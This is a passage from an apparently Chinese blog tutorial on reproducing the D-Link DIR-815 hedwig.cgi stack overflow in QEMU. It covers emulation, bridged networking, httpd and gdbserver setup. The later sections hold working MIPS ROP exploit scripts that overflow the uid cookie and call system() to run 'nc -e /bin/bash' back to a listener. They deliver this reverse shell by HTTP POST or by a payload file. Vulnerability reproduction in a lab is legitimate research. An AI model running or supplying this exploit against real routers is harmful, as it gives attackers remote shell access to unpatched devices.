exe=&quot;./htdocs/cgibin&quot;,</span><br><span class="line">               gdbscript=&quot;&quot;&quot;</span><br><span class="line">               b *0x402FFC\n    </span><br><span class="line">               c\n</span><br><span class="line">               &quot;&quot;&quot;)</span><br><span class="line">    pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = b&quot;uid=&quot; + payload</span><br><span class="line">post_content = &quot;Thir0th=Pwner&quot;</span><br><span class="line">p = process(b&quot;&quot;&quot;</span><br><span class="line">    qemu-mipsel -L ./ \</span><br><span class="line">    -0 &quot;hedwig.cgi&quot; \</span><br><span class="line">    -E REQUEST_METHOD=&quot;POST&quot; \</span><br><span class="line">    -E CONTENT_LENGTH=10 \</span><br><span class="line">    -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span><br><span class="line">    -E HTTP_COOKIE=\&quot;&quot;&quot;&quot; + payload + b&quot;&quot;&quot;\&quot; \</span><br><span class="line">    -E REQUEST_URI=&quot;2333&quot; \</span><br><span class="line">    -g 1234 ./htdocs/cgibin</span><br><span class="line">&quot;&quot;&quot;, shell = True)</span><br><span class="line"></span><br><span class="line">bug()</span><br><span class="line">p.send(post_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>‍</p><h2 id="qemu系统态模拟">qemu系统态模拟</h2><h3 id="step1-下载对应内核-镜像">step1 下载对应内核+镜像</h3><p><a href="https://people.debian.org/~aurel32/qemu/mipsel/">Index of /~aurel32/qemu/mipsel</a></p><p><img src="https://s2.loli.net/2025/06/25/njFp7cTJSz1YeVE.png" alt="image"></p><h3 id="step2-创建网桥">step2 创建网桥</h3><p>安装网络配置器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install bridge-utils uml-utilities</span><br></pre></td></tr></table></figure><p>修改interfaces文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/network/interfaces</span><br></pre></td></tr></table></figure><p>修改之前可以先备份</p><p><code>sudo cp /etc/network/interfaces /etc/network/interfaces.brk</code>​</p><p>修改为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"> </span><br><span class="line">auto ens33</span><br><span class="line">iface ens33 inet dhcp</span><br><span class="line">up ifconfig ens33 0.0.0.0 up</span><br><span class="line"> </span><br><span class="line">auto br0</span><br><span class="line">iface br0 inet dhcp</span><br><span class="line"> </span><br><span class="line">bridge_ports ens33</span><br><span class="line">bridge_maxwait 0</span><br></pre></td></tr></table></figure><p>在 <code>/etc/qemu-ifup</code>​ 文件中写入下面内容(如果没有则需要创建，然后使用 <code>sudo chmod a+x /etc/qemu-ifup</code>​)<br>注意是<code>写入</code>​，<code>不是</code>​改成下面内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo &quot;Executing /etc/qemu-ifup&quot;</span><br><span class="line">echo &quot;Bringing up $1 for bridge mode...&quot;</span><br><span class="line">sudo /sbin/ifconfig $1 0.0.0.0 promisc up</span><br><span class="line">echo &quot;Adding $1 to br0...&quot;</span><br><span class="line">sudo /sbin/brctl addif br0 $1</span><br><span class="line">sleep 2</span><br></pre></td></tr></table></figure><p>开启物理机的转发功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#! /bin/sh</span><br><span class="line">sudo sysctl -w net.ipv4.ip_forward=1</span><br><span class="line">sudo iptables -F</span><br><span class="line">sudo iptables -X</span><br><span class="line">sudo iptables -t nat -F</span><br><span class="line">sudo iptables -t nat -X</span><br><span class="line">sudo iptables -t mangle -F</span><br><span class="line">sudo iptables -t mangle -X</span><br><span class="line">sudo iptables -P INPUT ACCEPT</span><br><span class="line">sudo iptables -P FORWARD ACCEPT</span><br><span class="line">sudo iptables -P OUTPUT ACCEPT</span><br><span class="line">sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="line">sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT</span><br><span class="line">sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure><p>然后在到<code>/etc</code>​文件中创建一个 <code>/qemu/bridge.conf</code>​ 在这个文件中写入 <code>allow br0</code>​</p><p>配置好之后reboot</p><h3 id="step3-配置qemu网络">step3 配置qemu网络</h3><p>qemu启动脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># start.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">sudo qemu-system-mipsel \</span><br><span class="line">    -M malta -kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">    -hda debian_squeeze_mipsel_standard.qcow2 \</span><br><span class="line">    -append &quot;root=/dev/sda1 console=tty0&quot; \</span><br><span class="line">    -net nic,macaddr=00:16:3e:00:00:01 \</span><br><span class="line">    -net tap</span><br></pre></td></tr></table></figure><p>将start.sh与下载的内核+镜像放置在一起，启动qemu</p><p>账号密码都是root</p><p>执行后会出现一个黑色小窗口，然后里面在加载程序，最后可能会有一个 <code>fail</code>​ 但是不要紧，不影响我们复现漏洞，太多 <code>fail</code>​ 可能就有点问题了需要问AI检查一下</p><p><code>nano</code>​ 来修改 <code>/etc/network/interfaces</code>​</p><p>将eth0改为eth1，（ip -a查看一下qemu网卡，不一定是eth1）</p><p><img src="https://s2.loli.net/2025/06/25/Pk1n74aKVmFojlc.png" alt="image"></p><p>启用eth1接口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifup eth1</span><br></pre></td></tr></table></figure><p>之后执行ip -a就可以看到qemu的ip了</p><p>互ping，检测是否互通，按照上述步骤来是没问题的</p><p>在qemu中输入应该不方便，可以用ssh链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 低版本Ubutnu</span><br><span class="line">ssh root@192.168.xx.xx</span><br><span class="line"></span><br><span class="line"># 高版本Ubutnu</span><br><span class="line">ssh -o HostKeyAlgorithms=ssh-rsa root@192.168.xx.xx</span><br></pre></td></tr></table></figure><p>step4 启动环境</p><p>将路由器文件分解得到的 <code>/squashfs-root</code>​ 文件传入到 qemu虚拟机的 <code>/root</code>​ 文件夹下面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 低版本Ubutnu</span><br><span class="line">scp -r ./squashfs-root root@192.168.xx.xx:/root/</span><br><span class="line">scp -r &lt;本地Ubuntu文件地址&gt; root@192.168.xx.xx:&lt;qemu虚拟机文件地址&gt;</span><br><span class="line"></span><br><span class="line"># 高版本Ubuntu</span><br><span class="line">scp -o HostKeyAlgorithms=ssh-rsa -r ./squashfs-root root@192.168.xx.xx:/root/</span><br><span class="line">scp -o HostKeyAlgorithms=ssh-rsa -r &lt;本地Ubuntu文件地址&gt; root@192.168.xx.xx:&lt;qemu虚拟机文件地址&gt;</span><br></pre></td></tr></table></figure><p><code>/squashfs-root</code>​ 文件中使用 <code>nano指令</code>​ 创建一个 <code>http_conf</code>​ 文件用于开启httpd服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">Umask 026</span><br><span class="line">PIDFile /var/run/httpd.pid</span><br><span class="line">LogGMT On  #开启log</span><br><span class="line">ErrorLog /log #log文件</span><br><span class="line"> </span><br><span class="line">Tuning</span><br><span class="line">&#123;</span><br><span class="line">    NumConnections 15</span><br><span class="line">    BufSize 12288</span><br><span class="line">    InputBufSize 4096</span><br><span class="line">    ScriptBufSize 4096</span><br><span class="line">    NumHeaders 100</span><br><span class="line">    Timeout 60</span><br><span class="line">    ScriptTimeout 60</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Control</span><br><span class="line">&#123;</span><br><span class="line">    Types</span><br><span class="line">    &#123;</span><br><span class="line">        text/html    &#123; html htm &#125;</span><br><span class="line">        text/xml    &#123; xml &#125;</span><br><span class="line">        text/plain    &#123; txt &#125;</span><br><span class="line">        image/gif    &#123; gif &#125;</span><br><span class="line">        image/jpeg    &#123; jpg &#125;</span><br><span class="line">        text/css    &#123; css &#125;</span><br><span class="line">        application/octet-stream &#123; * &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Specials</span><br><span class="line">    &#123;</span><br><span class="line">        Dump        &#123; /dump &#125;</span><br><span class="line">        CGI            &#123; cgi &#125;</span><br><span class="line">        Imagemap    &#123; map &#125;</span><br><span class="line">        Redirect    &#123; url &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    External</span><br><span class="line">    &#123;</span><br><span class="line">        /usr/sbin/phpcgi &#123; php &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">Server</span><br><span class="line">&#123;</span><br><span class="line">    ServerName &quot;Linux, HTTP/1.1, &quot;</span><br><span class="line">    ServerId &quot;1234&quot;</span><br><span class="line">    Family inet</span><br><span class="line">    Interface eth1                          #对应qemu仿真路由器系统的网卡(如果是按照上面操作来的话就不用改)</span><br><span class="line">    Address 192.168.xx.xx                   #qemu仿真路由器系统的IP(需要改成自己的qemu虚拟机ip地址)</span><br><span class="line">    Port &quot;1234&quot;                             #对应未被使用的端口(一般也是不用改)</span><br><span class="line">    Virtual</span><br><span class="line">    &#123;</span><br><span class="line">        AnyHost</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /</span><br><span class="line">            Location /htdocs/web</span><br><span class="line">            IndexNames &#123; index.php &#125;</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/phpcgi &#123; router_info.xml &#125;</span><br><span class="line">                /usr/sbin/phpcgi &#123; post_login.xml &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /HNAP1</span><br><span class="line">            Location /htdocs/HNAP1</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/hnap &#123; hnap &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            IndexNames &#123; index.hnap &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>qemu执行以下脚本，启动web服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#init.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">cp http_conf /</span><br><span class="line">cp sbin/httpd /</span><br><span class="line">cp -rf htdocs/ /</span><br><span class="line">mkdir /etc_bak</span><br><span class="line">cp -r /etc /etc_bak</span><br><span class="line">rm /etc/services</span><br><span class="line">cp -rf etc/ /</span><br><span class="line">cp lib/ld-uClibc-0.9.30.1.so  /lib/</span><br><span class="line">cp lib/libcrypt-0.9.30.1.so  /lib/</span><br><span class="line">cp lib/libc.so.0  /lib/</span><br><span class="line">cp lib/libgcc_s.so.1  /lib/</span><br><span class="line">cp lib/ld-uClibc.so.0  /lib/</span><br><span class="line">cp lib/libcrypt.so.0  /lib/</span><br><span class="line">cp lib/libgcc_s.so  /lib/</span><br><span class="line">cp lib/libuClibc-0.9.30.1.so  /lib/</span><br><span class="line">cd /</span><br><span class="line">rm -rf /htdocs/web/hedwig.cgi</span><br><span class="line">rm -rf /usr/sbin/phpcgi</span><br><span class="line">rm -rf /usr/sbin/hnap</span><br><span class="line">ln -s /htdocs/cgibin /htdocs/web/hedwig.cgi</span><br><span class="line">ln -s /htdocs/cgibin /usr/sbin/phpcgi</span><br><span class="line">ln -s  /htdocs/cgibin /usr/sbin/hnap</span><br><span class="line">./httpd -f http_conf</span><br></pre></td></tr></table></figure><p>然后就应该可以去访问了</p><p><img src="https://s2.loli.net/2025/06/25/owAgE8zf9BLMKqn.png" alt="image"></p><p>可以用nmap去扫描qemu,检测端口是否开放</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.10.67</span><br></pre></td></tr></table></figure><h3 id="step4-远程">step4 远程</h3><p>需要用到gdbserver</p><p>已经编译完成的程序(但是作者好像命名错误了把mipsel打成了mipsle， 所以如果使用这个下面的脚本也需要改一改)</p><p><a href="https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver">https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver</a></p><h4 id="远程调试">远程调试</h4><p>qemu /root/squashfs-root/路径下创建run.sh</p><p>调试ip地址是虚拟机主机ip</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">export CONTENT_LENGTH=&quot;11&quot;</span><br><span class="line">export CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">export HTTP_COOKIE=&quot;uid=`cat payload`&quot;</span><br><span class="line">export REQUEST_METHOD=&quot;POST&quot;</span><br><span class="line">export REQUEST_URI=&quot;2333&quot;</span><br><span class="line">echo &quot;winmt=pwner&quot; | ./gdbserver 192.168.xx.xx:6666/htdocs/web/hedwig.cgi  </span><br><span class="line">#echo &quot;winmt=pwner&quot; | /htdocs/web/hedwig.cgi</span><br><span class="line">unset CONTENT_LENGTH</span><br><span class="line">unset CONTENT_TYPE</span><br><span class="line">unset HTTP_COOKIE</span><br><span class="line">unset REQUEST_METHOD</span><br><span class="line">unset REQUEST_URI</span><br></pre></td></tr></table></figure><p>注：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#echo &quot;winmt=pwner&quot;|./gdbserver.mipsel 192.168.10.60:6666 /htdocs/web/hedwig.cgi</span><br><span class="line"></span><br><span class="line">这一行代码是与gdb-multiarch调试的时候开启。</span><br><span class="line">192.168.10.60 为ubuntu的地址，`6666`是自己设置的连接的端口，直接用gdb-multiarch设置好架构后，用target remote 192.168.10.67:6666连上即可。其中192.168.10.67为qemu的地址。</span><br><span class="line"></span><br><span class="line">------------------------------------</span><br><span class="line"></span><br><span class="line"># echo &quot;winmt=pwner&quot;|/htdocs/web/hedwig.cgi</span><br><span class="line">这行代码是直接生成了payload直接攻击。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>需要将gdbserver.mipsel传入qemu中</p><p>然后gdb-multiarch 接过来即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set architecture mips                                     </span><br><span class="line">set follow-fork-mode child  </span><br><span class="line">set detach-on-fork off                                    </span><br><span class="line">target remote 192.168.xx.xxx:6666</span><br><span class="line">file ./htdocs/cgibin                   </span><br></pre></td></tr></table></figure><p>file  ./file</p><p>可以把文件加载到gdb里面获取函数名</p><p>qemu虚拟机要获取shell只能去打反弹shell，这里需要运行脚本，gdb-multiarch那边可以接收到我们发送的paylaod</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import requests</span><br><span class="line">context(os = &#x27;linux&#x27;, arch = &#x27;mips&#x27;, log_level = &#x27;debug&#x27;)</span><br><span class="line"> </span><br><span class="line">cmd = b&#x27;nc -e /bin/bash 192.168.87.135 8888&#x27; # 这里是Ubuntu物理机的地址</span><br><span class="line"> </span><br><span class="line">libc_base = 0x77f34000</span><br><span class="line"> </span><br><span class="line">payload = b&#x27;a&#x27;*0x3cd</span><br><span class="line">payload += p32(libc_base + 0x53200 - 1) # s0  system_addr - 1</span><br><span class="line">payload += p32(libc_base + 0x169C4) # s1  addiu $s2, $sp, 0x18 (=&gt; jalr $s0)</span><br><span class="line">payload += b&#x27;a&#x27;*(4*7)</span><br><span class="line">payload += p32(libc_base + 0x32A98) # ra  addiu $s0, 1 (=&gt; jalr $s1)</span><br><span class="line">payload += b&#x27;a&#x27;*0x18</span><br><span class="line">payload += cmd</span><br><span class="line"> </span><br><span class="line">url = &quot;http://192.168.87.136:1234/hedwig.cgi&quot; # 这里是qemu虚拟机的地址</span><br><span class="line">data = &#123;&quot;Thir0th&quot; : &quot;pwner&quot;&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;Cookie&quot;        : b&quot;uid=&quot; + payload,</span><br><span class="line">    &quot;Content-Type&quot;  : &quot;application/x-www-form-urlencoded&quot;,</span><br><span class="line">    &quot;Content-Length&quot;: &quot;10&quot;</span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url = url, headers = headers, data = data)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><p>./run之后，然后Ubuntu的gdb去连接，然后Ubuntu在开个终端发送exp然后gdb里面就可以收到，这样子调试，反弹shell，还要再开一个终端监听端口，一共需要四个终端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure><h4 id="远程攻击">远程攻击</h4><h5 id="法一：向-QEMU-虚拟机上传-payload">法一：向 QEMU 虚拟机上传 payload</h5><p>这种方式我们直接将 payload 写入文件，然后上传到 QEMU 虚拟机，通过设置环境变量来读取 payload 作为 uid，从而触发漏洞反弹 shell</p><p><a href="http://run.sh">run.sh</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">export CONTENT_LENGTH=&quot;11&quot;</span><br><span class="line">export CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">export HTTP_COOKIE=&quot;uid=`cat payload`&quot;</span><br><span class="line">export REQUEST_METHOD=&quot;POST&quot;</span><br><span class="line">export REQUEST_URI=&quot;2333&quot;</span><br><span class="line">#echo &quot;winmt=pwner&quot; | ./gdbserver 192.168.xx.xx:6666/htdocs/web/hedwig.cgi  </span><br><span class="line">echo &quot;winmt=pwner&quot; | /htdocs/web/hedwig.cgi</span><br><span class="line">unset CONTENT_LENGTH</span><br><span class="line">unset CONTENT_TYPE</span><br><span class="line">unset HTTP_COOKIE</span><br><span class="line">unset REQUEST_METHOD</span><br><span class="line">unset REQUEST_URI</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os = &#x27;linux&#x27;, arch = &#x27;mips&#x27;, log_level = &#x27;debug&#x27;)</span><br><span class="line"> </span><br><span class="line">cmd = b&#x27;nc -e /bin/bash 192.168.2.1 8888&#x27;   # 反弹 shell</span><br><span class="line"> </span><br><span class="line">libc_base = 0x77f34000</span><br><span class="line"> </span><br><span class="line">payload = b&#x27;a&#x27;*0x3cd</span><br><span class="line">payload += p32(libc_base + 0x53200 - 1) # s0  system_addr - 1</span><br><span class="line">payload += p32(libc_base + 0x169C4) # s1  addiu $s2, $sp, 0x18 (=&gt; jalr $s0)</span><br><span class="line">payload += b&#x27;a&#x27;*(4*7)</span><br><span class="line">payload += p32(libc_base + 0x32A98) # ra  addiu $s0, 1 (=&gt; jalr $s1)</span><br><span class="line">payload += b&#x27;a&#x27;*0x18</span><br><span class="line">payload += cmd</span><br><span class="line"> </span><br><span class="line">fd = open(&quot;payload&quot;, &quot;wb&quot;)</span><br><span class="line">fd.write(payload)</span><br><span class="line">fd.close()</span><br></pre></td></tr></table></figure><p>将生成的payload scp过去</p><h5 id="法二：向-httpd-服务发送-HTTP-报文">法二：向 httpd 服务发送 HTTP 报文</h5><p>‍</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;mips&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">cmd = b&#x27;nc -e /bin/bash 192.168.2.1 8888&#x27;   # 反弹 shell</span><br><span class="line"></span><br><span class="line">libc_base = 0x77f34000</span><br><span class="line"></span><br><span class="line"># 创建 payload</span><br><span class="line">payload = b&#x27;a&#x27; * 0x3cd</span><br><span class="line">payload += p32(libc_base + 0x53200 - 1)  # s0  system_addr - 1</span><br><span class="line">payload += p32(libc_base + 0x169C4)      # s1  addiu $s2, $sp, 0x18 (=&gt; jalr $s0)</span><br><span class="line">payload += b&#x27;a&#x27; * (4 * 7)</span><br><span class="line">payload += p32(libc_base + 0x32A98)      # ra  addiu $s0, 1 (=&gt; jalr $s1)</span><br><span class="line">payload += b&#x27;a&#x27; * 0x18</span><br><span class="line">payload += cmd</span><br><span class="line"></span><br><span class="line"># 定义目标 URL 和数据</span><br><span class="line">url = &quot;http://192.168.2.2:4321/hedwig.cgi&quot;</span><br><span class="line">data = &#123;&quot;winmt&quot;: &quot;pwner&quot;&#125;</span><br><span class="line"></span><br><span class="line"># 定义请求头</span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;Cookie&quot;: b&quot;uid=&quot; + payload,</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,</span><br><span class="line">    &quot;Content-Length&quot;: &quot;11&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 发送 POST 请求</span><br><span class="line">res = requests.post(url=url, headers=headers, data=data)</span><br><span class="line"></span><br><span class="line"># 打印响应</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><h2 id="退出仿真环境">退出仿真环境</h2><p><a href="http://xn--fini-ze9f338fu2ffu0f8qo.sh">退出是执行fini.sh</a>，要不然下次进去qemu会报错，init.sh脚本已经破坏了根目录，如果忘记的话重新下载内核和镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#fin.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">rm -rf /etc</span><br><span class="line">mv /etc_bak/etc /etc</span><br><span class="line">rm -rf /etc_bak</span><br></pre></td></tr></table></figure><p>关于虚拟桥接网络，可以不用去关闭</p><p>要关闭的话就这样，但后续配置还需要去配置虚拟桥连网络</p><p><img src="https://s2.loli.net/2025/06/25/KJo8Azvmh6uCiwR.png" alt="877a3e4faf9a4c875c3d22c7324239e1"></p><p>参考链接</p><p><a href="https://xz.aliyun.com/news/18079">DIR-815 栈溢出漏洞(CNVD-2013-11625)复现-先知社区</a></p><p><a href="https://xz.aliyun.com/news/17924">DIR-815 栈溢出漏洞-先知社区</a></p><p><a 